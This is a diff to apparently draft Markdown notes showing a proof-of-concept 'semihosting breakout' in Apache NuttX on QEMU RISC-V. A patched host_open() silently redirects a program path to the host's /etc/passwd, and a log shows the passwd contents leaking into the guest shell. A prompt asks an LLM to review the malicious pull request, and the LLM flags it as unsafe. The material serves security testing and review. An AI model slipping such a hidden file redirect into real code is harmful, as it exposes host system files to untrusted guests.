@@ -45,10 +45,103 @@ https://github.com/lupyuen2/wip-nuttx/pull/88#issuecomment-2664190707
 
 [See the Test Log](https://github.com/lupyuen2/wip-nuttx/pull/88#issuecomment-2664196921)
 
-# LLM Says Meh
+# Semihosting Breakout
 
-Test with LLM 
+https://github.com/lupyuen2/wip-nuttx/blob/sbo/arch/risc-v/src/common/riscv_hostfs.c#L117-L141
+
+```c
+int host_open(const char *pathname, int flags, int mode)
+{
+  _info("pathname=%s\n", pathname);
+  const char *pathname2 =
+    (strcmp(pathname, "../apps/bin/hello") == 0)
+    ? "/etc/passwd"
+    : pathname;
+  struct
+  {
+    const char *pathname;
+    long mode;
+    size_t len;
+  } open =
+  {
+    .pathname = pathname2,
+    .mode = host_flags_to_mode(flags),
+    .len = strlen(pathname2),
+  };
+
+#ifdef CONFIG_RISCV_SEMIHOSTING_HOSTFS_CACHE_COHERENCE
+  up_clean_dcache(pathname, pathname + open.len + 1);
+#endif
+
+  return host_call(HOST_OPEN, &open, sizeof(open));
+}
+```
+
+https://gist.github.com/lupyuen/a1c06b6cbf08feedee4d711b21561705
+
+```bash
+NuttShell (NSH) NuttX-12.4.0
+nsh> cat /system/bin/hello
+[    6.841514] host_open: pathname=../apps/bin/cat
+[    6.842859] host_open: pathname=../apps/bin/hello
+nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
+root:*:0:0:System Administrator:/var/root:/bin/sh
+daemon:*:1:1:System Services:/var/root:/usr/bin/false
+nsh> 
+```
+
+# LLM Says Nope!
+
+https://github.com/lupyuen2/wip-nuttx/pull/89
+
+https://patch-diff.githubusercontent.com/raw/lupyuen2/wip-nuttx/pull/89.diff
+
+https://gist.github.com/lupyuen/d5a6ac395744c1f33e10690105e20900
+
+```text
 Here is a Pull Request for Apache NuttX RTOS that I will check out to my computer and test on QEMU RISC-V 64-bit Kernel Mode. Is it safe to build and test this Pull Request on my computer?
+
+diff --git a/arch/risc-v/src/common/riscv_hostfs.c b/arch/risc-v/src/common/riscv_hostfs.c
+index aa1409d6a05b0..db54f11ae7623 100644
+--- a/arch/risc-v/src/common/riscv_hostfs.c
++++ b/arch/risc-v/src/common/riscv_hostfs.c
+@@ -33,6 +33,7 @@
+ #include <string.h>
+ #include <syscall.h>
+ #include <unistd.h>
++#include <debug.h>
+ 
+ /****************************************************************************
+  * Pre-processor Definitions
+@@ -115,6 +116,11 @@ static int host_flags_to_mode(int flags)
+ 
+ int host_open(const char *pathname, int flags, int mode)
+ {
++  _info("pathname=%s\n", pathname);
++  const char *pathname2 =
++    (strcmp(pathname, "../apps/bin/hello") == 0)
++    ? "/etc/passwd"
++    : pathname;
+   struct
+   {
+     const char *pathname;
+@@ -122,9 +128,9 @@ int host_open(const char *pathname, int flags, int mode)
+     size_t len;
+   } open =
+   {
+-    .pathname = pathname,
++    .pathname = pathname2,
+     .mode = host_flags_to_mode(flags),
+-    .len = strlen(pathname),
++    .len = strlen(pathname2),
+   };
+ 
+ #ifdef CONFIG_RISCV_SEMIHOSTING_HOSTFS_CACHE_COHERENCE
+```
+
+https://gist.github.com/lupyuen/d5a6ac395744c1f33e10690105e20900
+
+> No, it is not safe to build and test this Pull Request (PR) as it is, because it introduces a significant security vulnerability.
 
 # TODO
 
